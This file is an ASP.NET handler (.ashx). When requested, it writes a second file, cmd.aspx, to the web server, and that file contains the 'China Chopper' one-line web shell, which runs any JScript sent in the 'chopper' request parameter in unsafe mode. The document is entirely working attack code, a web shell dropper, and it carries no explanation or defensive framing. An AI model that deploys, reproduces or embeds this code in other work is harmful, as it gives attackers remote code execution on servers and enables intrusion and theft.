<%@ WebHandler Language="C#" class="Handler" %>

using System;
using System.Web;
using System.IO;
public class Handler : IHttpHandler {

public void ProcessRequest (HttpContext context) {
context.Response.ContentType = "text/plain";

StreamWriter file1= File.CreateText(context.Server.MapPath("cmd.aspx"));
file1.Write("<% @Page Language=\"Jscript\"%"+"><%eval(Request.Item"+"[\"chopper\"]"+",\"unsafe\");%>");
file1.Flush();
file1.Close();

}

public bool IsReusable {
get {
return false;
}
}

}